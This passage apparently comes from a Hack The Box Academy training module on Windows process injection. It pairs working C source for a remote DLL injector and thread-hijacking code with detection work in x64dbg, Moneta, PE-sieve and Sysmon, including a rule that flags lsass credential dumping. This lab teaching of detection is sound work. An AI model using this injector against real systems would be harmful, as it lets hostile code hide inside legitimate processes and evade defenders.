C:\> x86_64-w64-mingw32-gcc C:\injection\source_code\local_shellcode_inj.c -o C:\injection\source_code\local_shellcode_inj.exe -m64 -s -O2 -Os -Wno-write-strings -fno-exceptions -Wl,--gc-sections -Wno-missing-braces

```

After compiling with these flags, we can see that the size is significantly reduced, i.e., from 280 KB to 40 KB. The [GCC documentation](https://gcc.gnu.org/onlinedocs/) contains detailed information about the flags that can be passed to the `x86_64-w64-mingw32-gcc` compiler.
![Compile](https://academy.hackthebox.com/storage/modules/266/exe_compile.png)

Moving forward, we'll use these flags to reduce the payload size by default.

**Note:** This sample is already compiled and saved on the target system.

## Local Process Injection Demo

After the compilation, let's execute the local injection executable. We'll execute the code and understand each phase of this technique.

![Self process injection](https://academy.hackthebox.com/storage/modules/266/local_shell.gif)

Let's understand this step by step. First, a call to `VirtualAlloc` happens. We can see the address where the memory was allocated to store the shellcode.

![Self process injection](https://academy.hackthebox.com/storage/modules/266/image12.png)

To inspect the data at the allocated memory region, we can open `x64dbg` and attach the local injection process.

In the dump section in the bottom left, do a Right click and select " `Go to`" \> `Expression`.

![Dump](https://academy.hackthebox.com/storage/modules/266/image13.png)

Enter the address obtained from the local process where the memory is allocated for the shellcode.

![Expression](https://academy.hackthebox.com/storage/modules/266/image14.png)

The memory dump shows that it is allocated and zeroed out.

![Allocation](https://academy.hackthebox.com/storage/modules/266/image15.png)

Press any key to copy the shellcode to this address. Once the call of the `RtlMoveMemory()` function is successful, the shellcode will be written in this region. We can see the memory dump being populated with the shellcode. The byte sequence `48 83 EC` is same as the bytes in shellcode.

![Execution](https://academy.hackthebox.com/storage/modules/266/image16.png)

Then a new thread is created, which points to the start address where the shellcode was copied, i.e., `(LPTHREAD_START_ROUTINE)lpAlloc` in this case is the initial address of the thread's execution. However, the actual entry point of a thread created with `CreateThread` is a function named `RtlUserThreadStart`. The `RtlUserThreadStart` function performs tasks such as initializing thread-specific data structures, setting up the stack, and eventually calling the void pointer pointing to the address of the executable region where the shellcode was copied.

![Thread](https://academy.hackthebox.com/storage/modules/266/image26.png)

Open the newly created thread, and double click on it to open the stack call trace to check for anything suspicious. In this case, we can see that the `MessageBox` function was called.

![Stack call trace](https://academy.hackthebox.com/storage/modules/266/image28.png)

In x64dbg, we can view the thread in the `Threads` tab and check the thread entry. This can reveal the content that a thread is executing.

![Threads](https://academy.hackthebox.com/storage/modules/266/image29.png)

Once we click on " `Go to Thread Entry`", it opens the disassembler, where we can view the CPU instructions that are exactly the same content as the shellcode.

![Thread Entry](https://academy.hackthebox.com/storage/modules/266/image30.png)

## Save shellcode for analysis

We can extract the shellcode from the running sample and save it into a file for analysis. In x64dbg, we can select the shellcode, right-click on the selected bytes, and click on `Binary` \> `Save to a File`, as shown in the screenshot below.

![Thread Entry](https://academy.hackthebox.com/storage/modules/266/savetofile.png)

To perform a quick analysis of the shellcode, we can simply launch [speakeasy](https://github.com/mandiant/speakeasy), which is developed by Mandiant or tools like [scdbg](https://sandsprite.com/blogs/index.php?uid=7&pid=152).

Let's try this using speakeasy. This can be executed using the command below:

```cmd-session
C:\> speakeasy -t "C:\Users\Administrator\Desktop\shellcode.bin" -r -a x64

* exec: shellcode
0x1027: 'kernel32.LoadLibraryA("REDACTED.DLL")' -> 0x77d10000
0x1050: 'REDACTED.MessageBoxA(0x0, "Hello world", "Message", 0x0)' -> 0x2
0x1068: 'kernel32.ExitProcessW(0x0)' -> 0x0
* Finished emulating

```

In the next section, we'll study the detections for this attack technique.


# Detecting Self Injection

## Inspect Call Stack

Let's run the executable from the `Self Injection (Local Process Injection)` called `local_shellcode_inj.exe` located in the `C:\injection\local\` (or compile the executable through the source code located in the `C:\injection\source_code\` directory). Do not click on the OK button in the message box so that we can inspect the running process. Open the call stack for the newly created thread. We can double-click on the Thread ID in Process Hacker to open the stack call trace to check for anything suspicious. In this case, we can see that the thread starts at a random address, and then eventually, the `MessageBox()` function is called.

![Stack call trace](https://academy.hackthebox.com/storage/modules/266/run_local.png)

When analyzing the call stack, we have observed two important things:

- First, the return address pointing to an unmapped memory region (no image associated). This means that the instruction pointer ( `RIP` for x64, `EIP` for x86) is executing code from a memory segment that is not linked to any legitimate module or image. In this scenario, this memory region corresponds to the `RWX` (Read-Write-Execute) allocated memory, where the shellcode was injected. Since this memory was dynamically allocated (e.g., via VirtualAlloc, VirtualProtect, or NtAllocateVirtualMemory), it has no associated file on disk or module in memory.

- Second, a call to the `MessageBoxA()` function is used as a part of our shellcode to display a simple pop-up window as a confirmation of successful execution. The presence of `MessageBox()` in the call stack indicates that shellcode was executed within the process. In our case, this shellcode has a `MessageBox()` function, but in reality, this could be anything that attacker wants to execute.


## Detecting suspicious activity using Moneta

While the process is still running, we can also use [Moneta](https://github.com/forrest-orr/moneta), which is a live user-mode memory analysis tool for Windows with the capability to detect malware IOCs. The command to enumerate surface level information related to suspicious memory in a specific process is as follows:

```cmd-session
C:\> C:\Tools\Moneta64.exe -m ioc -p 1036

```

Here, `1036` is the PID of our target process (i.e., local\_shellcode\_inj.exe). When using `Moneta64`, we must take into consideration the PID of the process to be scrutinized.

![Stack call trace](https://academy.hackthebox.com/storage/modules/266/run_local1.png)

We can increase the verbosity to include more details using the `-v detail` flag to get a more detailed log of the committed memory in the target process:

```cmd-session
C:\> C:\Tools\Moneta64.exe -m * -p 1036 -v detail
   _____                        __
  /     \   ____   ____   _____/  |______
 /  \ /  \ /  _ \ /    \_/ __ \   __\__  \
/    Y    (  <_> )   |  \  ___/|  |  / __ \_
\____|__  /\____/|___|  /\___  >__| (____  /
        \/            \/     \/          \/

Moneta v1.0 | Forrest Orr | 2020

local_shellcode_inj.exe : 1036 : x64 : C:\injection\source_code\local_shellcode_inj.exe
  0x000000007FFE0000:0x00001000   | Private
    0x000000007FFE0000:0x00001000 | R        | 0x00000000
    |__ Base address: 0x000000007FFE0000
      | Size: 4096
      | Permissions: R
      | Type: PRV
      | State: Commit
      | Allocation base: 0x000000007FFE0000
      | Allocation permissions: R
      | Private size: 0 [0 pages]
  0x000000007FFEB000:0x00001000   | Private
    0x000000007FFEB000:0x00001000 | R        | 0x00000000
    |__ Base address: 0x000000007FFEB000

<SNIP>

0x0000015B27BE0000:0x00001000   | Private
    0x0000015B27BE0000:0x00001000 | RWX      | 0x00000000 | Abnormal private executable memory | Thread within non-image memory region
    |__ Base address: 0x0000015B27BE0000
      | Size: 4096
      | Permissions: RWX
      | Type: PRV
      | State: Commit
      | Allocation base: 0x0000015B27BE0000
      | Allocation permissions: RWX
      | Private size: 0 [0 pages]
      Thread 0x0000015B27BE0000 [TID 0x00001cdc]

```

This option shows a detailed view of the memory regions and we can dump a specific memory region by providing its address within a specific process from its allocation base. Here's an example of dumping a memory region at the address `0x0000015b27be0000`:

```cmd-session
C:\>  C:\Tools\Moneta64.exe -m ioc -p 1036 --option from-base --address 0x0000015b27be0000 -d

```

This is the same address where we added the shellcode, and it is executed by the thread.

![Stack call trace](https://academy.hackthebox.com/storage/modules/266/ldump1.png)

Using `speakeasy`, we can further perform analysis of this dumped `RWX` region, as it contains the shellcode:

```cmd-session
C:\> speakeasy -t 1036_0000015B27BE0000_RWX_PRV.dat -r -a x64

```

## Detecting suspicious activity using PE Sieve

We can also use [PE-sieve](https://github.com/hasherezade/pe-sieve), a tool that helps detect malware running on the system and collect potentially malicious material for further analysis. It recognizes and dumps a variety of implants within the scanned process: replaced/injected PEs, shellcodes, hooks, and other in-memory patches. It also detects inline hooks, Process Hollowing, Process Doppelgänging, reflective DLL injection, etc.

To detect the shellcode, we need to provide the /shellc 3 option, which instructs PE-sieve to scan the process memory for shellcode. The value 3 specifies the mode that scans all memory regions with an advanced heuristic for shellcode detection. We also need to provide the PID, i.e., /pid 4140, to scan the process.

![Detect](https://academy.hackthebox.com/storage/modules/266/pesieve-2.png)

This detects the injected shellcode from the scanned process and dumps it.

![Detect](https://academy.hackthebox.com/storage/modules/266/pesieve-1.png)

## Event Telemetry

The event logs from `Sealighter-TI` can help us detect the memory allocation event when the `VirtualAlloc()` function is called.

![Detect](https://academy.hackthebox.com/storage/modules/266/jonmon-local.png)

Elastic also detects this under event.code " `shellcode_thread`".

![Detect](https://academy.hackthebox.com/storage/modules/266/detectthis-4.png)


# Remote Dynamic-link Library Injection

In this technique, i.e., remote process injection (MITRE [T1055.001](https://attack.mitre.org/techniques/T1055/001/)), a process (let's call it process A) injects the shellcode/DLL into a remote process (process B). Unlike self-injection, where the process injects into itself, remote injection manipulates another process's memory space. This technique is often used for legitimate purposes, such as debugging and analyzing applications, but it can also be used maliciously by malware to `execute malicious code inside a target remote process`. There are many methods that can be combined with remote process injection, such as DLL injection, shellcode injection, thread hijacking, etc., but we'll be using DLL injection in this section. This injection is used mostly to evade detection by running code inside a legitimate process.

The diagram below provides a basic idea of the steps involved in a remote process injection attack.

![Remote](https://academy.hackthebox.com/storage/modules/266/image_37.png)

In case of DLL injection, the `path to a DLL` is written in the virtual address space of the target process. Then, the DLL is loaded by invoking `a new thread` in the target process. This injection can be performed with Windows API functions such as [VirtualAllocEx()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) and [WriteProcessMemory()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory), then invoked with [CreateRemoteThread()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) which calls the [LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) API responsible for loading the DLL.

Let's understand this first with an example of DLL Injection which involves injecting a dynamic link library (DLL) into the address space of a remote process. The injected DLL can then be used to execute arbitrary code within the context of the remote process.

## Source Code for Demo

We can understand this technique to perform a remote DLL injection attack using the C code below. This code asks for a PID (target process) and the path of a DLL to inject. First, it selects the remote process to inject code into (i.e., the PID we provide). A handle to the process can be obtained using `OpenProcess()` or `NtOpenProcess()` with permissions like PROCESS\_ALL\_ACCESS (or `PROCESS_VM_OPERATION` and `PROCESS_VM_WRITE`).

Then, memory can be allocated inside the remote process using functions like `VirtualAllocEx()` or `NtAllocateVirtualMemory()`. This memory is typically allocated as `RW` ( `PAGE_READWRITE`) so that data can be written into this memory region. Next, the payload (shellcode, DLL, or executable code) can be written into the allocated memory using functions like `WriteProcessMemory()`, or `NtWriteVirtualMemory()`, or `memcpy()`. We are going to write the path of the DLL in this memory region. After writing the path, the permissions are changed to Read-only using the `VirtualProtectEx()` function.

Next, the final phase is execution, where the injected code is executed. This can be done in multiple ways, but in this scenario, we have chosen to create a new thread in the remote process. This can be accomplished using functions like `CreateRemoteThread()`, `NtCreateThreadEx()`, or `RtlCreateUserThread()`. This thread will load the specified DLL into the remote process.

```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("\nUsage: %s <PID> <DLL Path>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open process. Error %d\n", GetLastError());
        return 1;
    }

    LPVOID dllPathAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddr == NULL) {
        printf("Failed to allocate memory in remote process. Error %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    } else {
        printf("\n[+] Allocated RW memory region in remote address : 0x%p\n", dllPathAddr);
    }

    printf("Press any key to write DLL path . . .\n");

    getchar();

    if (!WriteProcessMemory(hProcess, dllPathAddr, dllPath, strlen(dllPath) + 1, NULL)) {
        printf("Failed to write DLL path to remote process. Error %d\n", GetLastError());
        VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    } else {
        printf("[+] Code is written\n");
    }

    printf("Press any key to change permission from RW to R only. . .\n");

    getchar();

    DWORD oldProtect;
    BOOL protectResult = VirtualProtectEx(hProcess, dllPathAddr, strlen(dllPath) + 1, PAGE_READONLY, &oldProtect);
    if (!protectResult) {
        // Handle protection change error
        VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
    } else {
        printf("[+] Permissions of memory region at 0x%p changed to PAGE_READONLY\n", dllPathAddr);
    }

    printf("Press any key to create thread in remote process. . .\n");

    getchar();

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, dllPathAddr, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread. Error %d\n", GetLastError());
        VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote thread created\n");
    DWORD tid = GetThreadId(hThread);
    printf("[!] Remote thread TID: %lu\n", tid);
    printf("[!] Remote thread start address: 0x%p\n", GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryA"));
    printf("[+] DLL injected successfully.\n");

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, dllPathAddr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

```

## Compilation of Code

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`".
Then, let's RDP into the Target IP using the provided credentials.
The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the samples and tools at the following paths:

- **ProcessHacker**: `C:\injection\tools\ProcessHacker\ProcessHacker.exe`
- **x64dbg**: `C:\injection\tools\x64dbg\release\x64\x64dbg.exe`
- **Moneta**: `C:\injection\tools\Moneta64.exe`
- **PE Sieve**: `C:\injection\tools\pe-sieve64.exe`
- **Remote Injection**: `C:\injection\remote\injection1.exe`
- **DLL**: `C:\injection\htbdll.dll`

* * *

We can compile this code using the following command:

```cmd-session
C:\> x86_64-w64-mingw32-gcc C:\injection\source_code\remote_dll_injection.c -o  C:\injection\source_code\injection1.exe -m64 -s -O2 -Os -Wno-write-strings -fno-exceptions -Wl,--gc-sections -Wno-missing-braces

```

After compiling the code with these flags, the executable file is created. Let's execute this file and understand each phase of this technique.

**Note**: The compiled executable is also already available at the location `C:\injection\remote\injection1.exe`, and the DLL is available at the `C:\injection\htbdll.dll` location. When we execute this program, we need to specify a PID for the remote process, and the path of the DLL to be injected.

**Note:** 32-Bit DLL cannot be loaded by a 64-bit process and vice-versa.

A 32-bit DLL cannot be loaded by a 64-bit process, and vice versa, due to differences in the architecture and data sizes between 32-bit and 64-bit systems. The bitness (32-bit or 64-bit) of the DLL must match the bitness of the process that is loading it. Attempting to load a DLL with mismatched bitness will result in an error. In this example, we are injecting a 64-bit DLL ( `htbdll.dll` that we created previously) into the `notepad.exe` process.

First, the remote process handle is obtained using the `OpenProcess()` function with `PROCESS_ALL_ACCESS` access. Then, memory is allocated in the target process to write the module path. Next, a new thread is created in the remote process to load the DLL from the path written and execute the main function of the DLL. At this point, the injector process opens the handle of the target process and a handle to the remote thread.

When we inject the DLL into the `notepad.exe` process, the DLL's DllMain function is called which shows the success of the `MessageBox`.

![Classic Injection](https://academy.hackthebox.com/storage/modules/266/remote-inj.png)

The following demo showcases the workflow:

![Classic Injection](https://academy.hackthebox.com/storage/modules/266/remote_shell.gif)

Let's understand in detail what happened.

First, we provided the PID for the target `notepad.exe` process, i.e., 6476 in this case. Using the `OpenProcess` function (with `PROCESS_ALL_ACCESS` access), a handle to `notepad.exe` is obtained. Using the handle obtained, a new memory region is allocated (with address `0x000001b637010000`) in the process memory of notepad.exe. Notice the permissions are `RW`.

![Allocate](https://academy.hackthebox.com/storage/modules/266/image8.png)

Right-click on the memory address and select "Follow in Dump" to go to the memory dump to see the content of this memory address.

![Content](https://academy.hackthebox.com/storage/modules/266/image9.png)

As of now, it is empty. Once we press Enter, the `WriteProcessMemory()` function is called, which writes the DLL path to this address.

![Empty](https://academy.hackthebox.com/storage/modules/266/image31.png)

The DLL path is written. We can see it is populated in the memory dump in x64dbg.

![Write](https://academy.hackthebox.com/storage/modules/266/image32.png)

Once we press Enter, the `VirtualProtectEx()` function changes the permissions to `PAGE_READONLY`. We can verify in `x64dbg` or `Process Hacker` that the permissions are changed.

```c
VirtualProtectEx(hProcess, dllPathAddr, strlen(dllPath) + 1, PAGE_READONLY, &oldProtect);

```

![Permission](https://academy.hackthebox.com/storage/modules/266/image33.png)

Next is the `CreateRemoteThread` function, which is used to create a new thread in notepad.exe. As we can see in the syntax of this function, the parameter `lpStartAddress` is set to `(LPTHREAD_START_ROUTINE)LoadLibraryA`, which is a pointer to the `LoadLibraryA` function. This function is responsible for loading a DLL into the address space of the target process. By passing this function pointer, we are instructing the new thread to execute `LoadLibraryA`.

And the next parameter, `lpParameter`, contains the value of `dllPathAddr`, which is the pointer to the path of our DLL that we want to inject into the remote process. The `LoadLibraryA` function will use this path to load the DLL.

![CRT](https://academy.hackthebox.com/storage/modules/266/image34.png)

Using the function `CreateRemoteThread`, a new thread is created in the target process (notepad.exe), and its start address is set to `LoadLibraryA`, passing the DLL path ( `dllPathAddr`) as an argument. This causes the specified DLL to be loaded into the address space of notepad.exe, effectively injecting the DLL into the process.

![CRT](https://academy.hackthebox.com/storage/modules/266/image35.png)

Once the DLL is injected, we can see the MessageBox pop up.

![MessageBox](https://academy.hackthebox.com/storage/modules/266/image36.png)

Whenever `LoadLibraryA` is observed in the thread start addresses, it means that a DLL is injected or loaded by a thread in the process. Inspecting the loaded modules and memory addresses can reveal the module path.

![DLL](https://academy.hackthebox.com/storage/modules/266/image11.png)

Also, the handles of the target process and target thread were opened by the source injector process. We can verify this in the open handles of the injector process. The screenshot below shows the handles opened by the injector process, clearly indicating the process handle of `notepad.exe` (PID 6476) and the handle to the thread with ID `2656` running within notepad.exe.

![Open Handles](https://academy.hackthebox.com/storage/modules/266/image10.png)

In the next section, we'll go through the detections for this attack technique.


# Detecting DLL Injection

To detect DLL injection, we can use various tools such as `Moneta` to scan all running processes or target a particular process of choice. Additionally, we can also refer `Sysmon` for further log analysis. Moneta has the ability to detect when an unsigned DLL module is loaded in a remote process, which is usually deemed suspicious.

![Detect](https://academy.hackthebox.com/storage/modules/266/mon-remote-inj.png)

In the Sysmon event logs, we can see four main event logs: Process Create, Process Access, Create Remote Thread, and DLL Load.

## Process Creation Events

The `Process Creation Events` are events related to newly created processes, while providing detailed information about the process, typically identified as `Event ID 1`:

![Process Creation Events](https://academy.hackthebox.com/storage/modules/266/image38.png)

## Remote Process Access

The Sysmon ProcessAccess event ( `Event ID 10`) provides valuable information about processes accessing other processes, which can be useful for detection and hunting efforts.

![Process Access Events](https://academy.hackthebox.com/storage/modules/266/image39.png)

## Remote Thread creation

The `RemoteThreadCreation` event ( `Event ID 8`) detects processes that create threads in other processes, which is a typical behavior of code injection.

![Thread creation Events](https://academy.hackthebox.com/storage/modules/266/image40.png)

## DLL Loading event

In Sysmon, the DLL Loading event is bound to the `Image loaded` event ( `Event ID 7`), scrutinizing the DLLs loaded by processes. By default this type of an event needs to be manually configured.

![Thread creation Events](https://academy.hackthebox.com/storage/modules/266/image41.png)

In the event logs, you might have noticed that there is a field in the `ProcessAccess` event called " `CallTrace`." This is a valuable field that contains a stack trace of function calls leading up to the process access event.

Even if you check the Sysmon Process Access event logs or Process Monitor stack summary, the call stack trace always shows the sequence of functions that have been called to reach the current point in the code. Each function in the call stack calls the next function, and the addresses in the call stack trace correspond to the return addresses of these function calls.

## Call Stack tracing

A call stack contains the sequence of functions tracked in order. These functions are executed to perform some action in the program. The call trace information shows the details about the module (DLL) and the offset of the function that was executed.

### Call trace in Sysmon events

Sysmon logs the call stack trace in the `Call Trace` field:

![Call Trace](https://academy.hackthebox.com/storage/modules/266/image42.png)

### Call stack in Process Explorer

We can also view the call stack of an executable within `Process Explorer`:

![Call Trace](https://academy.hackthebox.com/storage/modules/266/image43.png)

### Call stack in Process Monitor

Additionally, we can use the `Stack Summary` feature within `Process Monitor` to view the call stack:

![Call Trace](https://academy.hackthebox.com/storage/modules/266/image44.png)

For example, in this scenario, our program is opening a handle to another process, i.e., notepad.exe. The call trace contains all the calls that end up opening a handle to the target process. Right after the call from the injector process, there is a call to `KernelBase.dll+308ee` followed by `ntdll.dll+9d4a4`. Let's check this offset in IDA to find what function is called.

![Call Trace](https://academy.hackthebox.com/storage/modules/266/image45.png)

As we can see, the code at `Kernelbase.dll+308ee` is inside the `OpenProcess` function, which calls a function at `ntdll.dll+9d4a4`. This function is `NtOpenProcess`, which is a lower-level system function used to perform the actual opening of a process handle.

![Call Trace](https://academy.hackthebox.com/storage/modules/266/image46.png)

Having an understanding of call trace proves valuable in detection engineering. When there are unique function calls in the stack for a particular behavior, it can help in creating detections as well. For example, if we are analyzing a program and discover that it creates a new file, we can examine the call stack to see which functions were involved in the file creation process. This information can help us understand the intent behind the file creation and whether it was done as part of normal program operation or as part of potentially malicious activity.

### Call Stack Detection Scenario

Let's see an example of creating a detection rule based on the information from the CallTrace. We can take the example of malware that performs credential dumping. When a memory dump of `lsass.exe` is created using `MiniDumpWriteDump()`, the call goes to this function, which exists in the `dbgcore.dll` module at offset 0x6e9b in this particular case:

![Call Trace](https://academy.hackthebox.com/storage/modules/266/image47.png)

We can add a condition in the Sysmon configuration so that it includes this information in the event log whenever there is a sign of `dbgcore.DLL` or `dbghelp.DLL` in the CallTrace field in the `ProcessAccess` Sysmon events.

```xml
<ProcessAccess onmatch="include">
    <CallTrace condition="contains" name="Credential Dumping using MiniDumpWriteDump">dbgcore.DLL</CallTrace>
    <CallTrace condition="contains" name="Credential Dumping using MiniDumpWriteDump">dbghelp.DLL</CallTrace>
</ProcessAccess>

```

When there is an activity of memory dumping using `MiniDumpWriteDump()`, this rule is triggered in the event logs. This can be helpful to extend the functionality of Sysmon events to create quality detection rules.

![Call Trace](https://academy.hackthebox.com/storage/modules/266/image48.png)

An example of an Elastic detection rule based on call stack is as follows.

[https://www.elastic.co/guide/en/security/current/prebuilt-rule-0-14-3-potential-credential-access-via-lsass-memory-dump.html](https://www.elastic.co/guide/en/security/current/prebuilt-rule-0-14-3-potential-credential-access-via-lsass-memory-dump.html)


# Intro to Thread Execution Hijacking

Thread Execution Hijacking, also known as `SIR` ( `Suspend, Inject, and Resume`), is a technique used by malware and other software to inject code into an existing thread of a process. This approach is often used to execute malicious code within the context of a legitimate process `without the need to create a new thread`. In this technique, the malware gains control over the execution of an existing thread within a running process, manipulates the `thread’s context` to redirect its execution flow to malicious code.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-19_.png)

## Steps involved in the Thread Hijacking

The general steps involved in Thread Execution Hijacking are:

- `Enumerate Processes and Threads`: The malware identifies a target process and its threads. Windows API functions such as [CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) and [Thread32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first) can be used to obtain a snapshot of running processes and threads.
- `Open Thread Handle`: Once a target thread is identified, the code calls [OpenThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) to obtain a handle to the thread. This handle is required for subsequent operations.
- `Suspend Thread`: The malware can use Windows API function such as [SuspendThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread) to `suspend` the execution of the target thread, ensuring that it does not continue executing while the code injection takes place.
- `Allocate Memory and Write Code`: The malware uses [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate memory within the target process's address space, typically with `read`, `write`, and `execute` permissions. It then uses [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the malicious code (often shellcode or the path to a malicious DLL) into the allocated memory region.
- `Set Thread Context`: To hijack the execution flow of the target thread, the malware calls [GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) to `retrieve the current execution context` (including the instruction pointer, registers, and other state information) of the suspended thread. It then `modifies the instruction pointer` (EIP or RIP register) to point to the injected code by calling [SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext).
- `Resume Thread`: Finally, the malware calls [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) to resume the execution of the target thread, which now starts executing the injected code.

## Dissecting a malware attack

The MITRE procedure examples show that [Gazer](https://web-assets.esetstatic.com/wls/2017/08/eset-gazer.pdf), [Trojan Karagany](https://www.secureworks.com/research/updated-karagany-malware-targets-energy-sector), and [Waterbear](https://www.trendmicro.com/en_us/research/19/l/waterbear-is-back-uses-api-hooking-to-evade-security-product-detection.html) utilize the thread execution hijacking technique to perform remote process injection.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-17.png)

We'll take a look at usage of this technique by [Turla's](https://attack.mitre.org/groups/G0010/) malware [sample](https://www.virustotal.com/gui/file/473aa2c3ace12abe8a54a088a08e00b7bd71bd66cda16673c308b903c796bec0/details) called as [Gazer](https://malpedia.caad.fkie.fraunhofer.de/details/win.gazer). Turla is a Russian-based highly sophisticated advanced persistent threat (APT) group that has been [suspected](https://cyberscoop.com/gazer-backdoor-turla-eset-2017/) to be operational since at least 2004. The backdoor used by Turla has been codenamed Gazer.

Here's a snippet from `Gazer` that shows a function performing the thread execution hijacking.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-18.png)

It first suspends a thread and calls [GetThreadContext()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) to retrieve the context of the suspended thread. Then it calls [SetThreadContext()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) to set the context of the thread. Setting the thread context allows control over the thread's execution state, including its registers, flags, and instruction pointer. Finally, it tries to resume the suspended thread using [ResumeThread()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread).

In the next section, we will showcase an implementation of this attack technique.


# TEH - Implementation and Debugging

## Implementation

Let's understand this technique using a custom program that takes an argument as a process name to target for a thread execution hijacking attack. It then retrieves its PID (process ID), which is passed to the `OpenProcess()` function to open the process object. Memory is then allocated to write shellcode in the remote process. It finds the running thread, suspends it, and changes the thread context to point to the address of the injected code using the [SetThreadContext()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) function.

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`". Then, let's RDP into the Target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the samples and tools at the following paths:

- **ProcessHacker**: `C:\injection\tools\ProcessHacker\ProcessHacker.exe`
- **IDA**: `C:\Program Files\IDA Freeware 8.4\ida64.exe`
- **x64dbg**: `C:\injection\tools\x64dbg\release\x64\x64dbg.exe`
- **TEH Injection**: `C:\injection\threadhijacking\threadhijacking.exe`

In this scenario, our target process is `notepad.exe`. First, we ensure that `notepad.exe` is running on the system. Then, we execute the `threadhijacking.exe` program and provide it with the name of target process, i.e., `notepad.exe`.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-3.png)

The function [GetProcessIdByName()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocessid) mentioned in the code snippet below retrieves the process ID (PID) of a process given its name. It uses the Windows Tool Help Library functions ( `CreateToolhelp32Snapshot()`, `Process32First()`, `Process32Next()`) to iterate through the running processes and find the one with the specified name ( `processName`). If the process is found, it returns its `PID`; otherwise, it returns 0.

```c
DWORD GetProcessIdByName(const char* processName)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnap, &pe32))
        {
            do
            {
                if (strcmp(pe32.szExeFile, processName) == 0)
                {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }

        CloseHandle(hSnap);
    }

    return pid;
}

```

In the disassembler, it looks like this: it calls `CreateToolhelp32Snapshot()` to create a snapshot of the current processes ( `dwFlags = 2` for `TH32CS_SNAPPROCESS`).

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh.png)

For each process, it compares the process name ( `szExeFile`) with the provided process name using `strcmp`.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-1.png)

If a match is found, it stores the process ID ( `th32ProcessID`) in `esi` and breaks out of the loop.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-2.png)

The retrieved process ID is passed to the `OpenProcess` function, which opens the process object and allocates memory of the size of the shellcode in the remote process using the `VirtualAllocEx` function.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-4.png)

It writes the shellcode or data to the allocated memory using `WriteProcessMemory`.

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-5.png)

Below is how this is represented in a disassembler:

![Thread Execution Hijacking](https://academy.hackthebox.com/storage/modules/266/teh-6.png)

Then, it creates a snapshot of the threads in the process using `CreateToolhelp32Snapshot` and iterates over the threads using the `Thread32First` and `Thread32Next` functions. It checks if the thread's owner process ID matches the target process ID. If it finds a matching thread, it opens the thread using `OpenThread`.

